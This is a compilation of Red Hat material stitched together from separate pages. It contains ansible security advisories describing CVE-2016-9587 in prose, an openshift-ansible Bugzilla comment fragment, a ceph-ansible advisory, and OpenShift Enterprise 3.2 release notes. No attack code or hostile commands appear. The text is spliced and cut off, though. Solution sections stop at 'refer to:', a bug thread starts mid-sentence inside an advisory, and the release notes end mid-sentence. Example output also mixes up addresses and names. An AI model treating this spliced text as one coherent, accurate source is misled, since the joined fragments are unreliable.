## Synopsis

Important: ansible security update

## Type/Severity

Security Advisory: Important

## Red Hat Insights patch analysis

Identify and remediate systems affected by this advisory.

[View affected systems](https://console.redhat.com/insights/patch/advisories/RHSA-2017%3A0195)

## Topic

An update for ansible is now available for Red Hat OpenStack Platform 10.0 (Newton).

Red Hat Product Security has rated this update as having a security impact of Important. A Common Vulnerability Scoring System (CVSS) base score, which gives a detailed severity rating, is available for each vulnerability from the CVE link(s) in the References section.

## Description

Ansible is a radically simple model-driven configuration management, multi-node deployment, and remote task execution system. Ansible works over SSH and does not require any software or daemons to be installed on remote nodes. Extension modules can be written in any language and are transferred to managed machines automatically.

The following packages have been upgraded to a newer upstream version: ansible (2.2.1.0). (BZ#1412370)

Security Fix(es):

* An input validation vulnerability was found in Ansible's handling of data sent from client systems. An attacker with control over a client system being managed by Ansible and the ability to send facts back to the Ansible server could use this flaw to execute arbitrary code on the Ansible server using the Ansible-server privileges. (CVE-2016-9587)

## Solution

For details on how to apply this update, which includes the changes described in this advisory, refer to:

## Synopsis

Important: ansible and gdeploy security and bug fix update

## Type/Severity

Security Advisory: Important

## Red Hat Insights patch analysis

Identify and remediate systems affected by this advisory.

[View affected systems](https://console.redhat.com/insights/patch/advisories/RHSA-2017%3A0260)

## Topic

An update for ansible and gdeploy is now available for Red Hat Gluster Storage 3.1 for RHEL 7.

Red Hat Product Security has rated this update as having a security impact of Important. A Common Vulnerability Scoring System (CVSS) base score, which gives a detailed severity rating, is available for each vulnerability from the CVE link(s) in the References section.

## Description

Ansible is a simple model-driven configuration management, multi-node deployment, and remote task execution system. Ansible works over SSH and does not require any software or daemons to be installed on remote nodes. Extension modules can be written in any language and are transferred to managed machines automatically.

The gdeploy package provides Ansible modules to setup and configure GluterFS.

Security Fix(es):

* An input validation vulnerability was found in Ansible's handling of data sent from client systems. An attacker with control over a client system being managed by Ansible and the ability to send facts back to the Ansible server could use this flaw to execute arbitrary code on the Ansible server using the Ansible-server privileges. (CVE-2016-9587)

Bug Fix(es):

* Previously, if SELinux Policy Management tool was not installed, gdeploy did not display any error. Hence, the SELinux context was not being set. With this update, gdeploy throws error if SELinux Policy Management tool is not installed on the machine. (BZ#1340038)
* This update introduces the Slice Unit configuration feature for the glusterfs services to organize a hierarchy for barriering the processes within a specific memory, cpu limits. This feature ensures that the Red Hat Gluster Storage's systemd unit(s) starts within the specified Slice. To configure Slice, add the following parameter to the configuration file: slice\_setup=yes (BZ#1349790)

## Solution

For details on how to apply this update, which includes the changes described in this advisory, refer to:

Same fix can be applied to :  playbooks/common/openshift-master/restart_hosts.yml /playbooks/common/openshift-master/restart_hosts_pacemaker.yml /playbooks/common/openshift-master/restart_services.yml /playbooks/common/openshift-master/restart_services_pacemaker.yml   ```  [Comment 1](show_bug.cgi?id=1393000#c1)  Scott Dodson    2016-11-08 19:21:02 UTC  ``` Can you confirm that this is happening only when the ansible host does not have access to the API endpoint? That seems like a really odd configuration, is that expected in this environment?  That said, I agree with the proposed fix. I think the chances of being able to access the API endpoint from the remote host rather than local host is probably higher.   ```  [Comment 5](show_bug.cgi?id=1393000#c5)  Andrew Butcher    2017-01-05 21:32:40 UTC  ``` Proposed fix: <https://github.com/openshift/openshift-ansible/pull/3032>   ```  [Comment 14](show_bug.cgi?id=1393000#c14)  liujia    2017-02-16 11:37:08 UTC  ``` Version: atomic-openshift-utils-3.3.64-1.git.0.43bfb06.el7.noarch  Step: 1. rpm install ocp3.2 2. upgrade 3.2 to 3.3  Result： Upgrade successfully.   ```  [Comment 15](show_bug.cgi?id=1393000#c15)  Anping Li    2017-02-16 12:13:24 UTC  ``` update containerized Env pass too.   ```  [Comment 17](show_bug.cgi?id=1393000#c17)  errata-xmlrpc    2017-03-06 16:37:11 UTC  ``` Since the problem described in this bug report should be resolved in a recent advisory, it has been closed with a resolution of ERRATA.

## Topic

An update for ansible and ceph-ansible is now available for Red Hat Storage Console 2.

Red Hat Product Security has rated this update as having a security impact of Important. A Common Vulnerability Scoring System (CVSS) base score, which gives a detailed severity rating, is available for each vulnerability from the CVE link(s) in the References section.

## Description

The ceph-ansible package provides Ansible playbooks for installing, maintaining, and upgrading Red Hat Ceph Storage.

Ansible is a simple model-driven configuration management, multi-node deployment, and remote task execution system. Ansible works over SSH and does not require any software or daemons to be installed on remote nodes. Extension modules can be written in any language and are transferred to managed machines automatically.

The following packages have been upgraded to a later upstream version: ceph-installer (1.2.2), ansible (2.2.1.0), python-passlib (1.6.5), ceph-ansible (2.1.9). (BZ#1405630)

Security Fix(es):

* An input validation vulnerability was found in Ansible's handling of data sent from client systems. An attacker with control over a client system being managed by Ansible and the ability to send facts back to the Ansible server could use this flaw to execute arbitrary code on the Ansible server using the Ansible server privileges. (CVE-2016-9587)

Bug Fix(es):

* Previously, the ceph-ansible utility permanently disabled the swap partition. With this update, ceph-ansible can no longer disable swap. (BZ#1364167)
* Previously, the ceph-ansible utility did not support adding encrypted OSD nodes. As a consequence, an attempt to upgrade to a newer, minor, or major version failed on encrypted OSD nodes. In addition, Ansible returned the following error message during the disk activation task:

mount: unknown filesystem type 'crypto\_LUKS'

With this update, ceph-ansible supports adding encrypted OSD nodes, and upgrading works as expected. (BZ#1366808)

* Due to a bug in the underlying source code, the ceph-ansible utility in some cases failed on the copy roundep task. Consequently, the installation process was unsuccessful. This bug has been fixed, and the installation now proceeds as expected. (BZ#1382878)
* Previously, installation using the ceph-ansible utility failed on the "fix partitions gpt header or labels of the journal devices" task in the ceph-osd role because of an empty variable. The underlying source code has been modified, and the installation no longer fails in this case. (BZ#1400967)
* Previously, Red Hat Console Agent setup performed by the ceph-ansible utility only supported installations by using the Content Delivery Network (CDN). Installations with an ISO file or local Yum repository failed. With this update, all installations are successful. (BZ#1403576)
* Previously, the ceph-ansible utility was unable to purge a cluster with encrypted OSD devices because the underlying ceph-disk utility was unable to destroy the partition table on an encrypted device by using the "--zap-disk" option. The underlying source code has been fixed allowing ceph-disk to use the "--zap-disk" option on encrypted devices. As a result, ceph-ansible can purge clusters with encrypted OSD devices as expected. (BZ#1414647)
* Previously, during the creation of Ceph clusters with nodes that use IPv6 addressing, ceph-ansible added the "ms bind ipv6" key to the Ceph configuration file, but it did not assign any value to it. This behavior caused an error when parsing the configuration file after the cluster creation. With this update, the "ms bind ipv6" key is properly set in the Ceph configuration file allowing for proper configuration file parsing on clusters that use IPv6 addressing. (BZ#1419814)

Enhancement(s):

* The ceph-ansible utility now supports the client role. This new role enables you to install Ceph clients by using Ansible and deploy nodes to run tests against the Ceph cluster. (BZ#1384622)
* The ceph-installer API now supports installation of OSD nodes that have journals collocated on the same devices. (BZ#1412867)

## Overview

OpenShift Enterprise by Red Hat is a Platform as a Service (PaaS) that provides
developers and IT organizations with a cloud application platform for deploying
new applications on secure, scalable resources with minimal configuration and
management overhead. OpenShift Enterprise supports a wide selection of
programming languages and frameworks, such as Java, Ruby, and PHP.

Built on Red Hat Enterprise Linux and Kubernetes, OpenShift Enterprise provides
a secure and scalable multi-tenant operating system for today’s enterprise-class
applications, while providing integrated application runtimes and libraries.
OpenShift Enterprise brings the OpenShift PaaS platform to customer data
centers, enabling organizations to implement a private PaaS that meets security,
privacy, compliance, and governance requirements.

## New Features and Enhancements

OpenShift Enterprise version 3.2 is now available. Ensure that you follow the
instructions on upgrading your OpenShift cluster properly, including steps
specific to this release.

|  | For any release, always review the Installation and Configuration guide for instructions on [upgrading your OpenShift cluster](../install_config/upgrading/index.html#install-config-upgrading-index) properly, including any additional steps that may be required for a specific release. |
| --- | --- |

### For Administrators

#### Updated Infrastructure Components

* Kubernetes has been updated to v1.2.0-36.
* etcd has been updated to v2.2.5.
* OpenShift Enterprise 3.2 requires Docker 1.9.1.

#### Configuration and Administration

* [Admission
  controllers](../architecture/additional_concepts/admission_controllers.html#architecture-additional-concepts-admission-controllers) are now included, which intercept requests to the master API prior
  to persistence of a resource, but after the request is authenticated and
  authorized. The following admission control plug-ins can be configured:

  + The number of projects an individual user can create can be limited via the
    `ProjectRequestLimit` admission controller. See
    [Limiting
    Number of Self-Provisioned Projects Per User](../admin_guide/managing_projects.html#limit-projects-per-user) for details.
  + A build defaults admission controller can be used to set default environment
    variables on all builds created, including global proxy settings. See
    [Configuring Global Build
    Defaults and Overrides](../install_config/build_defaults_overrides.html#install-config-build-defaults-overrides) for details.
  + The `PodNodeConstraints` admission control plug-in has been added, which
    constrains the use of the `NodeName` field in a pod definition to roles which
    have the `pods/binding` permission. This allows administrators, via
    `NodeSelectorLabelBlacklist`, to specify node labels by setting them in the
    `NodeSelector` field of the pod definition. See
    [Controlling Pod
    Placement](../admin_guide/scheduler.html#controlling-pod-placement) for details.
* Multiple web login providers can now be configured at the same time.
* The `oc adm diagnostics` command can now launch a diagnostic pod that reports on
  more potential issues with pod networking, DNS configuration, and registry
  authentication.
* Support for security context constraints (SCCs) has been added to the `oc
  describe` command.
* The `NO_PROXY` environment variable will now accept a CIDR in a number of
  places in the code for controlling which IP ranges bypass the default HTTP proxy
  settings. See
  [Configuring
  Hosts for Proxies](../install_config/http_proxies.html#configuring-hosts-for-proxies) for details.
* Masters are now taken down one at a time during upgrades through rolling
  restarts. The `openshift_rolling_restart_mode` parameter can now be used in
  Ansible inventories to control this behavior: `services` for service restarts or
  `system` for full system restarts. See
  [Configuring
  Cluster Variables](../install_config/install/advanced_install.html#configuring-cluster-variables) for details.

#### Security

* The new `Volumes` field in SCCs allows an administrator full control over
  which volume plug-ins may be specified.

  + In order to maintain backwards compatibility, the `AllowHostDirVolumePlugin`
    field takes precedence over the `Volumes` field for the host mounts. You may
    use `*` to allow all volumes.
  + By default, regular users are now forbidden from directly mounting any of the
    remote volume type; they must use a persistent volume claim (PVC).
* The new `ReadOnlyRootFilesystem` field in SCCs allows an administrator to
  force containers to run with a read-only root file system.

  + If set to true, containers are required to run with a read-only root file system
    by their `SecurityContext`. Containers that do not set this value to true will
    be defaulted. Containers that explicitly set this value to false will be
    rejected.
  + If set to false, containers may use a read-only root file system, but they are
    not forced to run with one.
* By default, the **restricted** and **anyuid** SCCs drop Linux capabilities that
  could be used to escalate container privileges. Administrators can change the
  list of default or enforced capabilities.
* A constant-time string comparison is now used on webhooks.
* Only users authenticated via OAuth can request projects.
* A GitLab server can now be used as an identity provider. See
  [Configuring
  Authentication](../install_config/configuring_authentication.html#GitLab) for details.
* The `SETUID` and `SETGID` capabilities have been added back to the **anyuid** SCC,
  which ensures that programs that start as root and then drop to a lower
  permission level will work by default.
* Quota support has been added for `emptydir`. When the quota is enabled on an
  XFS system, nodes will limit the amount of space any given project can use on a
  node to a fixed upper bound. The quota is tied to the `FSGroup` of the
  project. Administrators can control this value by editing the project directly
  or allowing users to set `FSGroup` via SCCs.
* The `DaemonSet` object is now limited to cluster administrators because pods
  running under a `DaemonSet` are considered to have higher priority than
  regular pods, and for regular users on the cluster this could be a security
  issue.
* Administrators can prevent clients from accessing the API by their `User-Agent`
  header the new `userAgentMatching` configuration setting.

#### Integrated Docker Registry

* A readiness probe and health check have been added to the integrated registry to
  ensure new instances do not serve traffic until they are fully initialized.

#### Routes

* You can limit the frequency of router reloads using the `--interval=DURATION`
  flag or `RELOAD_INTERVAL` environment variable to the router. This can
  minimize the memory and CPU used by the router while reloading, at the cost of
  delaying when the route is exposed via the router.
* Routers now report back status to the master about whether routes are accepted,
  rejected, or conflict with other users. The CLI will now display that error
  information, allowing users to know that the route is not being served.
* Using *router sharding*, you can specify a selection criteria for either
  namespaces (projects) or labels on routes. This enables you to select the routes
  a router would expose, and you can use this functionality to distribute routes
  across a set of routers, or shards.

#### Storage

* The `NoDiskConflicts` scheduling predicate can be added to the scheduler
  configuration to ensure that pods using the same Ceph RBD device are not placed
  on the same node. See [Scheduler](../admin_guide/scheduler.html#admin-guide-scheduler) for details.

#### Administrator CLI

* The administrative commands are now exposed via `oc adm` so you have access to
  them in a client context. The `oadm` commands will still work, but will be a
  symlink to the `openshift` binary.
* The help output of the `oadm policy` command has been improved.
* Service accounts are now supported for the router and registry:

  + The router can now be created without specifying `--credentials` and it will use
    the router service account in the current project.
  + The registry will also use a service account if `--credentials` is not
    provided. Otherwise, it will set the values from the `--credentials` file as
    environment on the generated deployment configuration.
* Administrators can pass the `--all-namespaces` flag to `oc status` to see status
  information across all namespaces and projects.

#### Web Console

* Users can now be presented with a customized, branded page before continuing on
  to a login identity provider. This allows users to see your branding up front
  instead of immediately redirecting to identity providers like GitHub and Google.
  See
  [Customizing
  the Login Page](../install_config/web_console_customization.html#customizing-the-login-page) for details.
* CLI download URLs and documentation URLs are now customizable through web
  console extensions. See
  [Adding
  or Changing Links to Download the CLI](../install_config/web_console_customization.html#adding-or-changing-links-to-download-the-cli) for details.

### For Developers

#### Web Console

* The web console uses a brand new theme that changes the look and feel of the
  navigation, tabs, and other page elements. See
  [Project
  Overviews](../architecture/infrastructure_components/web_console.html#project-overviews) for details.

  ![Updated Web Console Theme](data:image/png;base64...)
* A new **About** page provides developers with information about the product
  version, `oc` CLI download locations, and a quick access to their current token
  to login using `oc login`. See
  [CLI
  Downloads](../architecture/infrastructure_components/web_console.html#web-console-cli-downloads) for details.

  ![New About Page](data:image/png;base64...)
* You can now add or edit resource constraints for your containers during **Add to
  Project** or later from the deployment configuration.

  ![Set Resource Limits](data:image/png;base64...)
* A form-based editor for build configurations has been added for modifying
  commonly edited fields directly from the web console.

  ![Edit Build Configurations](data:image/png;base64...)
* All **Browse** resource pages (e.g, viewing a particular pod) now have a tab for
  **Events** related to that pod.
* Limits, quotas, and quota scopes are now displayed.
* More error and warning information is now displayed about routes, their
  configuration, and their use in the system.
* Support has been added for filtering and sorting on all **Events** pages.
* You can now edit a project’s display name and description from the **Settings**
  page.
* Existing persistent volume claims (PVCs) can now be listed and attached to
  deployments and deployment configurations.
* More detailed pod status is now provided on all pages.
* Better status and alert messages are now provided.
* Improved ***Dockerfile*** build keyword highlighting has been added when editing
  builds.
* More accurate information is now displayed about routes based on which addresses
  the router exposed them under.
* The layout and display of logs have been improved.

#### Developer CLI

* The following commands have been added to `oc create`, allowing more objects to
  be created directly using the CLI (instead of passing it a file or JSON/YAML):

  | Command | Description |
  | --- | --- |
  | `namespace` | Create a namespace with the specified name. |
  | `secret` | Create a secret using a specific subcommand: `docker-registry` or `generic`. |
  | `configmap` | Create a `ConfigMap` from a local file, directory, or literal value. |
  | `serviceaccount` | Create a service account with the specified name. |
  | `route` | Expose containers externally via secured routes. Use the `edge`, `passthrough`, or `reencrypt` subcommands and specify the secret values to be used for the route. |
* Display more information about the application being created by the `oc new-app`
  command, including any display name or description set on the image as a label,
  or whether the image may require running as root.
* If you have set up the **latest** tag in an image stream to point to another tag
  in the same image stream, the `oc new-app` command will follow that reference
  and create the application using the referenced tag, not **latest**. This allows
  administrators to ensure applications are created on stable tags (like
  **php:5.6**). The default image streams created in the **openshift** project follow
  this pattern.
* You can view the logs of the oldest pod in a deployment or build configuration
  with:

  ```
  $ oc logs dc/<name>
  ```
* The `oc env` and `oc volume` commands have been moved to `oc set env` and `oc
  set volume`, and future commands that modify aspects of existing resources will
  be located under this command.
* When a pod is crash-looping, meaning it is starting and exiting repeatedly, an
  error is now displayed in `oc status` output and provides more information about
  possible causes.
* The new `oc debug` command makes it easy to obtain shell access in a misbehaving
  pod. It clones the exact environment of the running deployment configuration,
  replication controller, or pod, but replaces the run command with a shell.
* The new `oc set trigger` command can be used to update deployment and build
  configuration triggers.
* More information is displayed about liveness and readiness probes in the `oc
  status` and `oc describe` commands.

#### Builds and Image Sources

* Builds can now be supplied with input files from unrelated images. Previously,
  all input to a build had to come from the builder image itself, or a Git
  repository. It is now possible to specify additional images and paths within
  those images to use as an input to a build for things like external
  dependencies.

  Use the `--source-image=<image>` and
  `--source-image-path=<source>:<destination>` flags with the `oc new-build`
  command to specify images.

  The example shown below injects the ***/usr/lib/jenkins/jenkins.war*** file out of
  the image currently tagged with **jenkins:latest** into the ***installed-apps***
  directory of the build input:

  ```
  apiVersion: v1
  kind: BuildConfig
  metadata:
    name: imagedockerbuild
  spec:
    source:
      images:
      - from:
          kind: ImageStreamTag
          name: jenkins:latest
        paths:
        - destinationDir: installed-apps/
          sourcePath: /usr/lib/jenkins/jenkins.war
  ```

  Ensure that you set an image change trigger for **jenkins:latest** if you want to
  rebuild every time that image is updated.
* Builds can now be supplied with secrets for use during the build process.
  Previously, secrets could be used for Git cloning but now secrets can also be
  made available to the build process itself so that build operations such as
  Maven packaging can use a secret for credentials. See
  [Using Secrets During a Build](../dev_guide/builds.html#using-secrets) for
  details.
* Builds now properly use Git submodules when checking out the source repository.
  When a build configuration is deleted (via `oc delete`), all associated builds
  are now deleted as well. To prevent this behavior, specify `--cascade=false`.
* Custom build configurations can now specify the API version to use. This API
  version will determine the schema version used for the serialized build
  configuration supplied to the custom build pod in the `BUILD` environment
  variable.
* Resource limits are now enforced on the container launched by S2I builds, and
  also on the operations performed within containers as part of a `docker build`
  of a ***Dockerfile***. Previously, the resource limit only applied to the build
  pod itself and not the containers spawned by the build process.
* You can now provide a command to be triggered after a build succeeds but before
  the push. You can set `shell` (to run a shell script), `command`, or `args` to
  run a command in the working directory of the built image. All S2I builders set
  the user’s source repository as the working directory, so commands like `bundle
  exec rake test` should work. See [Build
  Hooks](../dev_guide/builds.html#build-hooks) for details.

#### Image Imports

* You can now import images from Docker v2 registries that are authenticated via Basic or Token credentials. To import, create a secret in your project based on a ***.docker/config.json*** or ***.dockercfg*** file:

  ```
  $ oc secrets new hub .dockerconfigjson=$HOME/.docker/config.json
  Created secret/hub

  $ oc import-image auth-protected/image-from-dockerhub
  The import completed successfully.

  Name:       image-from-dockerhub
  Created:    Less than a second ago

  Tag     Spec                                 Created
  latest  default/image-from-dockerhub:latest  Less than a second ago ...
  ```

  When importing, all secrets in your project of those types will be checked. To
  exclude a secret from being a candidate for importing, use the
  `openshift.io/image.excludeSecret` annotation set to **true**:

  ```
  $ oc annotate secret/hub openshift.io/image.excludeSecret=true
  ```
* Image stream tags can be set to be automatically imported from remote
  repositories when they change (public or private). OpenShift Enterprise will
  periodically query the remote registry and check for updates depending on the
  configuration the administrator sets. By default, images will be checked every
  15 minutes.

  To set an image to be imported automatically, use the `--scheduled` flag with
  the `oc tag` command:

  ```
  $ oc tag --source=docker redis:latest myredis:latest --scheduled
  Tag myredis:latest set to import redis:latest periodically.
  ```

  You can see which images are being scheduled using:

  ```
  $ oc describe is myredis
  ```

  Administrators can control whether scheduling is enabled, the polling interval,
  and the rate at which images can be imported via the `imagePolicyConfig`
  section in the ***/etc/origin/master/master-config.yaml*** file.
* The integrated Docker registry now supports *image pullthrough*, allowing you to
  tag a remote image into OpenShift Enterprise and directly pull it from the integrated
  registry as if it were already pushed to the OpenShift Enterprise registry. If the
  remote registry is configured to use content-offload (sending back a temporary
  redirect URL to the actual binary contents), that value will be passed through
  the OpenShift Enterprise registry and down to the Docker daemon, avoiding the need to
  proxy the binary contents.

  To try pullthrough, tag an image from the DockerHub:

  ```
  $ oc tag --source=docker redis:latest redis:local
  $ oc get is redis
  NAME      DOCKER REPO                     TAGS     UPDATED
  mysql     172.30.1.5:5000/default/redis   local    Less than a second ago
  ```

  Log into your local Docker registry, then pull the image from the integrated
  registry:

  ```
  $ docker pull 127.30.1.5:5000/default/redis:local
  Using default tag: local
  Trying to pull repository 127.30.1.5:5000/default/redis ... latest: Pulling from 127.30.1.5:5000/default/redis
  47d44cb6f252: Pull complete
  838c1c5c4f83: Pull complete
  5764f0a31317: Pull complete
  60e65a8e4030: Pull complete
  449f8db3c25a: Pull complete
  a6b6487c42f6: Pull complete
  Digest: sha256:c541c66a86b0715bfbb89c5515929268196b642551beccf8fbd452bb00170cde
  Status: Downloaded newer image for 127.30.1.5:5000/default/redis:local
  ```

  You can use pullthrough with private images; the integrated registry will use
  the same secret you imported the image with to fetch content from the remote
  registry.
* The `oc describe` command now reports overall image size for imported images as
  well as the individual layers and size of each layer.
* When importing an entire remote repository, only the first five tags are
  imported by default. OpenShift Enterprise preferentially imports the **latest** tag and
  the highest semantically versioned tag (i.e., tags in the form **v5**, **5.0**, or
  **5.0.1**). You can import the remaining tags directly. Lists of tags will be
  sorted with the latest tag on top, followed by the highest major semantic tags,
  in descending order.

#### Test Deployments

It is now possible to create a "test" deployment that will scale itself down to
zero when a deployment is complete. This deployment can be used to verify that
an image will be correctly rolled out without requiring the pods to be running
all the time. To create a test deployment, use the `--as-test` flag on `oc
new-app` or set the `spec.test` field of a deployment configuration to `true`
via `oc edit`.

The deployment triggers like any other deployment configuration, scaling up to
the current `spec.replicas` value when triggered. After the deployment has
completed with a success or failure, it is then scaled down to zero. You can use
deployment hooks to test or verify the deployment; because hooks run as part of
the deployment process, a test suite running in your hook can ensure your
application is correct and pass or fail the deployment.

You can add a local database or other test container to the deployment pod
template, and have your application code verify itself before passing to the
next step.

Scaling a test deployment will only affect the next deployment.

#### Recreate Strategy

* The Recreate deployment strategy now supports `mid` hooks, which run while all
  old pods have been scaled down and before any new pods are scaled up; use it to
  run migrations or configuration changes that can only happen while the
  application is completely shut down.
* The Recreate deployment strategy now has the same behavior as the Rolling
  strategy, requiring the pod to be "Ready" before continuing with the deployment.
  A new field `timeoutSeconds` was added to the strategy that is the maximum
  allowed interval between pods becoming ready; it defaults to `120s`.

#### Other Enhancements

* The new Kubernetes 1.2 [ConfigMap](../dev_guide/configmaps.html#dev-guide-configmaps) resource is
  now usable.
* Pods being pulled or terminating are now distinguished in the pod status output,
  and the size of images is now shown with other pod information.
* The Jenkins image can now be used as an S2I-compatible build image. See
  [Using
  Jenkins as a Source-to-Image Builder](../using_images/other_images/jenkins.html#jenkins-as-s2i-builder) for details.

## Notable Technical Changes

OpenShift Enterprise 3.2 introduces the following notable technical changes:

### For Administrators

#### Services with External IPs Rejected by Default

By default, services with external IPs are now rejected because, in some cases,
they can be used to allow services to pretend to act as nodes. The new
`networkConfig.externalIPNetworkCIDR` parameter has been added to the
***master-config.yaml*** file to control the allowable values for external IPs. By
default, it is empty, which rejects all values. Cluster administrators can set
it to `0.0.0.0/0` to emulate the behavior from OpenShift Enterprise 3.1.

#### Build Strategy Permissions Separated into Distinct Roles

Build strategy permissions have been separated into distinct roles.
Administrators who have denied access to Docker, Source, or Custom builds must
now assign users or groups to those roles by default. See
[Securing Builds by Strategy](../admin_guide/securing_builds.html#admin-guide-securing-builds) for
details.

#### FSGroup Enabled by Default for restricted and hostaccess SCCs

`FSGroup` is now enabled by default in the **restricted** and **hostaccess** SCCs.
This means that pods matched against those SCCs will now:

* Have the `pod.spec.securityContext.fsGroup` field populated to a
  namespace-wide allocated value automatically.
* Have their **emptyDir**-derived (**emptyDir**, **gitRepo**, **secret**, **configMap**, and
  **downwardAPI**) and block device volumes (basically every network volume except
  **ceph** and **nfs**) owned by the `FSGroup`.
* Run with the `FSGroup` in each container’s list of supplemental groups.

#### Tightened Directory Permissions on Hosts

Permissions on the ***/etc/origin*** directory have been tightened to prevent
unprivileged users from reading the contents of this directory tree.
Administrators should ensure that, if necessary, they have provided other means
to access the generated CA certificate.

#### DNS Changes

* By default, new nodes installed with OpenShift Enterprise 3.2 will have Dnsmasq
  installed and configured as the default nameserver for both the host and pods.
* By default, new masters installed with OpenShift Enterprise 3.2 will run SkyDNS on
  port 8053 rather than 53. Network access controls must allow nodes to connect to
  masters on port 8053. This is necessary so that Dnsmasq may be configured on all
  nodes.

|  | The above DNS changes only apply to new installations of OpenShift Enterprise 3.2. Clusters upgraded from OpenShift Enterprise 3.1 to 3.2 do not currently have these changes applied during the upgrade process. |
| --- | --- |

#### New Default Values for Pod Networking

The default values for pod networking have changed:

| ***master-config.yaml*** Field | Ansible Variable | Old Value | New Value |
| --- | --- | --- | --- |
| `clusterNetworkCIDR` | `osm_cluster_network_cidr` | 10.1.0.0/16 | 10.128.0.0/14 (i.e., 10.128.0.0 - 10.131.255.255) |
| `hostSubnetLength` | `osm_host_subnet_length` | 8 (i.e., /24 subnet) | 9 (i.e., /23 subnet) |

#### API Changes

* Due to a change in the upstream JSON serialization path used in Kubernetes, some
  fields that were previously accepted case-insensitively are no longer accepted.
  Please validate that your API objects have the correct case for all attributes.
* When creating a deployment configuration, omitting the `spec.selector` field
  will default that value to the pod template labels.
* `ImageStreamTag` objects now return the spec tag `tag`, the current status
  conditions, and latest status generation `generation`, so clients can get an
  accurate view of the current tag.
* `ImageStreamTag` objects can be updated via `PUT` to set their spec tag in a
  single call.
* Deployment configuration hooks now default the container name if there is only a
  single container in the deployment configuration.

#### Increased Default MaxPodsPerNode

The default value for `MaxPodsPerNode` has been increased to `110` to reflect
updated capacity.

#### High Availability Masters Support

Administrators are recommended to take advantage of the native HA method for
multiple masters built in to OpenShift instead of previous solutions such as
Pacemaker. Starting with OpenShift Enterprise 3.2, the Pacemaker HA method is no
longer supported by the installer and upgrade playbooks, and administrators
should upgrade to the native HA method before upgrading the cluster to 3.2. See
the
[Upgrading
from Pacemaker to Native HA](https://docs.openshift.com/enterprise/3.1/install_config/upgrading/pacemaker_to_native_ha.html) in the OpenShift Enterprise 3.1 documentation for
instructions.

### For Developers

#### Developer CLI

The `oc rsh` command now launches `/bin/sh`, not `/bin/bash`. To have the old
behavior, run:

```
$ oc rsh <name> -- /bin/bash
```

## Bug Fixes

The following bugs have been fixed:

* Passthrough routes may not be specified with paths. Because passthrough does not
  decode the route, there is no way for the router to check the path without
  decoding the request. The `oc status` command will now warn you if you have any
  such routes.
* The `oc new-app` command now returns more information about errors encountered
  while searching for matches to user input.
* When using images from registries that are not the DockerHub, do not insert the `library` prefix.
* The image ID returned from the `ImageStreamImage` API was not the correct value.
* The router health check was not correct on all systems when using host
  networking. It now defaults to using **localhost**.
* OAuth client secrets are now correctly reset in HA master configurations.
* Improved the web console’s performance when displaying many deployments or builds.
* The router unique host check should not reprocess routes that did not change.
* Added the `AlwaysPull` admission controller to prevent users from being able
  to run images that others have already pulled to the node.
* Fixed `oc edit` when editing multiple items in a list form.
* The recycler for persistent volumes now uses a service account and has proper
  access to restricted content.
* The block profiler in `pprof` is now supported.
* Additional `cGroup` locations are now handled when constraining builds.
* Scratch images from `oc new-app` are now handled.
* Added support for paged LDAP queries.
* Fixed a performance regression in `cAdvisor` that resulted in long pauses on
  Kubelet startup.
* The `oc edit` command was not properly displaying all errors when saving an
  edited resource failed.
* More information is now shown about persistent volume claims and persistent
  volumes in a number of places in the CLI and web console.
* Some commands that used the API PATCH command could fail intermittently when
  they were executed on the server and another user edited at the same time.
* Users are now warned when trying to import a non-existent tag with the `oc
  import-image` command.
* Singular pods are now shown in `oc status` output.
* Router fixes:

  + More information is now shown from the router reload command in the router logs.
  + Routes that changed at the same time could compete for being exposed if they
    were in different namespaces. The check for which route gets exposed has been
    made predictable.
  + The health check is now used when restarting the router to ensure the new
    process is correctly running before continuing.
* Better errors are displayed in the web console when JavaScript is disabled.
* Failed deployments now update the status of the deployment configuration more
  rapidly, reducing the time before the old deployment is scaled back up.
* Persistent volume claims (PVCs) are no longer blocked by the default SCC policy
  for users.
* Continue to support host ports on the `oadm router` command. Administrators can
  disable them with `--host-ports=false` when `--host-network=false` is also set.
* Events are now emitted when the cancellation of a deployment fails.
* When invoking a binary build, retry if the input image stream tag does not exist
  yet (because it may be in the process of being imported).
* Fixed a race condition in Kubernetes where endpoints might be partially updated
  (only have some pods) when the controller is restarted.
* Docker containers do not allow CPU quota less than `10m`, so set the minimum
  value.
* Do not sync `DaemonSet` objects that match all pods.
* The `oc new-build` command no longer fails when creating a binary build on a Git
  repository that does not have an upstream remote set.
* Fixed a race condition between scaled up routers where some changes might be
  ignored.
* Enable the etcd watch cache for Kubernetes resources, reducing memory use and
  duplicate watches.
* Change the `RunOnce` pod duration restrictor to act as a limit instead of
  override.
* Guarantee partially completed builds are cleaned up when cancelled.
* Check `claimRef` UID when processing a recycled persistent volume (PV) to
  prevent races.
* The `ProjectRequestLimit` plug-in now ignores projects in terminating state.
* The `ConfigMap` volume is now readable as non-root.
* The **system:image-auditor** role has been added for managing the image registry.
* Dynamic volume provisioning can now be disabled.
* Deployment pods should now be cancelled when deployments are cancelled in all
  cases.
* The deployer controller should now ensure deployments that are cancelled cannot
  become completed.
* Concurrent deployer pod creation is now prevented.
* Fixed an issue where a pod would never terminate if the registry it pulls images
  from was unavailable.
* Fixed precision of CPU to millicore and memory to Mi in the UI.
* The HAProxy router should now obfuscate the pod IP in when using cookies for
  session affinity.

## Technology Preview Features

Some features in this release are currently in Technology Preview. These
experimental features are not intended for production use. Please note the
following scope of support on the Red Hat Customer Portal for these features:

[Technology Preview
Features Support Scope](https://access.redhat.com/support/offerings/techpreview)

The following features are in Technology Preview:

* Introduced in OpenShift Enterprise 3.1.1,
  [dynamic
  provisioning](../install_config/persistent_storage/dynamically_provisioning_pvs.html#install-config-persistent-storage-dynamically-provisioning-pvs) of persistent storage volumes from Amazon EBS, Google Compute
  Disk, OpenStack Cinder storage providers remains in Technology Preview for
  OpenShift Enterprise 3.2.

## Known Issues

* At the general availability release of OpenShift Enterprise 3.2, there was a known
  issue with upgrades for
  [containerized
  installation](../install_config/install/rpm_vs_containerized.html#install-config-install-rpm-vs-containerized) environments from OpenShift Enterprise 3.1 to 3.2. Upgrades were only
  supported for clusters using the RPM-based installation method. As of the
  release of the [RHBA-2016:1208](#ose-32-relnotes-rhba-2016-1208) advisory,
  this issue has been resolved, and containerized upgrades are now supported after

## Asynchronous Errata Updates

Security, bug fix, and enhancement updates for OpenShift Enterprise 3.2 are
released as asynchronous errata through the Red Hat Network. All OpenShift
Enterprise 3.2 errata is
[available on the Red Hat
Customer Portal](https://access.redhat.com/downloads/content/290/). See the
[OpenShift Enterprise
